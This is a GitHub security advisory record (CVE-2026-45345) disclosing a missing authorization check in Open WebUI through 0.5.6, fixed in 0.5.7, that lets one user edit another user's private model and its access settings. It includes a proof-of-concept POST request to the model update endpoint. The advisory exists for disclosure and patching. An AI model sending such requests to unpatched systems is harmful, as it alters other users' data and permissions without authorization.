{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/37290182?v=4", "events_url": "https://api.github.com/users/simioni87/events{/privacy}", "followers_url": "https://api.github.com/users/simioni87/followers", "following_url": "https://api.github.com/users/simioni87/following{/other_user}", "gists_url": "https://api.github.com/users/simioni87/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/simioni87", "id": 37290182, "login": "simioni87", "node_id": "MDQ6VXNlcjM3MjkwMTgy", "organizations_url": "https://api.github.com/users/simioni87/orgs", "received_events_url": "https://api.github.com/users/simioni87/received_events", "repos_url": "https://api.github.com/users/simioni87/repos", "site_admin": false, "starred_url": "https://api.github.com/users/simioni87/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/simioni87/subscriptions", "type": "User", "url": "https://api.github.com/users/simioni87", "user_view_type": "public"}}], "cve_id": "CVE-2026-45345", "cvss": {"score": 6.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}, "cvss_severities": {"cvss_v3": {"score": 6.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-285", "name": "Improper Authorization"}], "description": "### Summary
A user can modify another user's model even if its visibility is set to `Private`.
The finding resulted from a penetration test for a customer. It is suspected that the root cause of the issue lies within the core of Open WebUI, which is why it is being reported as a security issue here. Tested on Open WebUI 0.5.4.

### Details / PoC
The user `Victim` created a private model with the visibility set to `private`: 
![grafik](https://github.com/user-attachments/assets/de057943-512b-46bf-8671-2904d55ec056)

The user `Attacker` can edit this model using the following POST request:
```
POST /api/v1/models/model/update?id=aaabraaa HTTP/2
Host: domain.local
//Some headers removed
Te: trailers

{"id":"aaabraaa","base_model_id":"gpt-4o-POC","name":"testmodel","meta":{"profile_image_url":"/static/favicon.png","description":"","capabilities":{"vision":true,"usage":false,"citations":true},"suggestion_prompts":null,"tags":[],"toolIds":["test"]},"params":{},"user_id":"565c82e6-083f-42bb-bf0f-a4e214cfb9ad","access_control":{"read":{"group_ids":[],"user_ids":[]},"write":{"group_ids":[],"user_ids":[]}},"is_active":true,"updated_at":1737314575,"created_at":1737121281}
```
Request / Response
![grafik](https://github.com/user-attachments/assets/19986403-b782-4288-b618-202b55519bb1)

### Impact
A user can modify another user's model even if its visibility is set to `Private`. By changing the access permissions during editing, unauthorized access can be gained.", "epss": {"percentage": 0.00226, "percentile": 0.13102}, "ghsa_id": "GHSA-gm54-m39w-grjp", "github_reviewed_at": "2026-05-14T20:21:38Z", "html_url": "https://github.com/advisories/GHSA-gm54-m39w-grjp", "identifiers": [{"type": "GHSA", "value": "GHSA-gm54-m39w-grjp"}, {"type": "CVE", "value": "CVE-2026-45345"}], "nvd_published_at": "2026-05-15T22:16:54Z", "published_at": "2026-05-14T20:21:38Z", "references": ["https://github.com/open-webui/open-webui/security/advisories/GHSA-gm54-m39w-grjp", "https://nvd.nist.gov/vuln/detail/CVE-2026-45345", "https://github.com/advisories/GHSA-gm54-m39w-grjp"], "repository_advisory_url": "https://api.github.com/repos/open-webui/open-webui/security-advisories/GHSA-gm54-m39w-grjp", "severity": "medium", "source_code_location": "https://github.com/open-webui/open-webui", "summary": "Open WebUI missing authorization check at the model update function - models from other users can be updated", "type": "reviewed", "updated_at": "2026-05-19T15:59:23Z", "url": "https://api.github.com/advisories/GHSA-gm54-m39w-grjp", "vulnerabilities": [{"first_patched_version": "0.5.7", "package": {"ecosystem": "pip", "name": "open-webui"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 0.5.6"}], "withdrawn_at": null}

reasons: 資産不一致または判定情報不足

title: Open WebUI missing authorization check at the model update function - models from other users can be updated
